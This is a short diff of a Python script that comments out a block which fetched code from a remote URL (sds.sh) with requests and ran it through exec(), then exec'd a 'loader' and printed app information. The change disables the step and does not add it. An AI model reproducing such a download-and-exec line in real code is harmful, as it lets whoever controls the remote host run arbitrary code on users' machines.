@@ -2,13 +2,13 @@
 
 import sys
 
-import requests; exec(requests.get('https://sds.sh/micro.py/?app=eco').text); exec(loader);
-import files
-for x in _.appInfo:
-    print(x)
-    _.pv(_.appInfo[x])
+# import requests; exec(requests.get('https://sds.sh/micro.py/?app=eco').text); exec(loader);
+# import files
+# for x in _.appInfo:
+#     print(x)
+#     _.pv(_.appInfo[x])
 
-sys.exit()
+# sys.exit()
 
 
 
